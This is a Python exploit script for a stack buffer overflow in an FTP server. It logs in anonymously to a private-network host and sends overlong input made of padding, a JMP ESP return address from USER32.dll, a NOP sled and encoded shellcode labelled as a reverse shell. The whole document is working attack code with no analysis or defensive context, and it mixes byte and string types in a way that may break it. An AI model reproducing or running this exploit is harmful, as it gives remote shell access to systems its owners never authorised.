
import socket
import sys
import struct

USER    = "anonymous"
PASSWD  = "anon"

revshell =  b""
revshell += b"\xd9\xe8\xd9\x74\x24\xf4\xbd\xfb\xef\xc9\x95\x5f"
revshell += b"\x2b\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\x14"
revshell += b"\x13\x2b\x60\x16\x04\x2e\x8b\xe6\xd5\x4f\x05\x03"
revshell += b"\xe4\x4f\x71\x40\x57\x60\xf1\x04\x54\x0b\x57\xbc"
revshell += b"\xef\x79\x70\xb3\x58\x37\xa6\xfa\x59\x64\x9a\x9d"
revshell += b"\xd9\x77\xcf\x7d\xe3\xb7\x02\x7c\x24\xa5\xef\x2c"
revshell += b"\xfd\xa1\x42\xc0\x8a\xfc\x5e\x6b\xc0\x11\xe7\x88"
revshell += b"\x91\x10\xc6\x1f\xa9\x4a\xc8\x9e\x7e\xe7\x41\xb8"
revshell += b"\x63\xc2\x18\x33\x57\xb8\x9a\x95\xa9\x41\x30\xd8"
revshell += b"\x05\xb0\x48\x1d\xa1\x2b\x3f\x57\xd1\xd6\x38\xac"
revshell += b"\xab\x0c\xcc\x36\x0b\xc6\x76\x92\xad\x0b\xe0\x51"
revshell += b"\xa1\xe0\x66\x3d\xa6\xf7\xab\x36\xd2\x7c\x4a\x98"
revshell += b"\x52\xc6\x69\x3c\x3e\x9c\x10\x65\x9a\x73\x2c\x75"
revshell += b"\x45\x2b\x88\xfe\x68\x38\xa1\x5d\xe5\x8d\x88\x5d"
revshell += b"\xf5\x99\x9b\x2e\xc7\x06\x30\xb8\x6b\xce\x9e\x3f"
revshell += b"\x8b\xe5\x67\xaf\x72\x06\x98\xe6\xb0\x52\xc8\x90"
revshell += b"\x11\xdb\x83\x60\x9d\x0e\x03\x30\x31\xe1\xe4\xe0"
revshell += b"\xf1\x51\x8d\xea\xfd\x8e\xad\x15\xd4\xa6\x44\xec"
revshell += b"\xbf\x08\x30\x8a\x4a\xe1\x43\x52\xa4\xad\xca\xb4"
revshell += b"\xac\x5d\x9b\x6f\x59\xc7\x86\xfb\xf8\x08\x1d\x86"
revshell += b"\x3b\x82\x92\x77\xf5\x63\xde\x6b\x62\x84\x95\xd1"
revshell += b"\x25\x9b\x03\x7d\xa9\x0e\xc8\x7d\xa4\x32\x47\x2a"
revshell += b"\xe1\x85\x9e\xbe\x1f\xbf\x08\xdc\xdd\x59\x72\x64"
revshell += b"\x3a\x9a\x7d\x65\xcf\xa6\x59\x75\x09\x26\xe6\x21"
revshell += b"\xc5\x71\xb0\x9f\xa3\x2b\x72\x49\x7a\x87\xdc\x1d"
revshell += b"\xfb\xeb\xde\x5b\x04\x26\xa9\x83\xb5\x9f\xec\xbc"
revshell += b"\x7a\x48\xf9\xc5\x66\xe8\x06\x1c\x23\x08\xe5\xb4"
revshell += b"\x5e\xa1\xb0\x5d\xe3\xac\x42\x88\x20\xc9\xc0\x38"
revshell += b"\xd9\x2e\xd8\x49\xdc\x6b\x5e\xa2\xac\xe4\x0b\xc4"
revshell += b"\x03\x04\x1e"


crash  = "A" * 2012
crash += struct.pack("<I", 0x774aa027) # USER32.dll - Jmp ESP
crash += "\x90" * 30
crash += revshell
crash += "C" * (20002 - len(crash))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.120",21))
data = s.recv(1024)

print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)

print("[-] Sending exploit...\n")
s.send(crash) # +'\r\n')
s.close()

print("[!] Done! Exploit successfully sent\n")

